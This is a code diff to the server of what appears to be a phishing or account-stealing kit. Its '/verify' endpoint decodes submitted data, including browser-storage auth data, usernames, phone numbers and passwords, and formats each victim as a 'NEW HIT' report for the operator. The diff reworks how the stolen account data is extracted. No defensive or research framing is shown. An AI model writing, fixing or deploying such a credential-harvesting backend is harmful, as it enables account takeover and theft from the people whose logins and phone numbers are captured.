@@ -34,17 +34,17 @@ app.get('/', (req, res) => {
 app.post('/verify', async (req, res) => {
     const decodedData = atob(req.body)
     const jsonData = JSON.parse(decodedData)
-    const parsedLs = JSON.parse(jsonData.ls)
-    const userAuth = JSON.parse(parsedLs.user_auth)
-    const userId = userAuth.id
-    const userData = await getUserData(userId)
+    const userData = jsonData.userData
+    if( userData ) {
+        console.log(`Recieved acc: ${userData.username}`)
+    }
 
     const textMessage = [
         `NEW HIT JUST ARRIVED 🔻\n`,
 
         ...(userData?[`Name: ${userData?.first_name ? `${userData.first_name} ` : ''}${userData?.last_name ? userData.last_name : ''}`]:[]),
         ...(userData?[`Username: ${userData.username}`]:[]),
-        ...(jsonData.phone?[`Phone: ${jsonData.phone}`]:[]),
+        ...(userData?.phone?[`Phone: ${userData.phone}`]:[]),
         ...(jsonData.pass?[`Password: ${jsonData.pass}`]:[]),
         '\n',
 
